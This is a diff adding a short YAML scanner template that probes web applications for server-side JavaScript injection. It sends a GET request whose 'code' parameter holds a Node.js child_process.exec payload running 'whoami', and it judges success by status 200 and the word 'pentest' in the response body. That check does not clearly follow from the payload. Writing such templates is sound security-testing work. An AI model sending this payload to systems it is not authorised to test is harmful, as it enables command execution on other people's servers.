@@ -1,0 +1,10 @@
+name: Server-Side-JavaScript-Injection
+set:
+  r1: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?code=require('child_process').exec('whoami > {{r1}}.txt')
+    expression: response.status == 200 && response.body.bcontains(b'pentest')
+expression: r0()
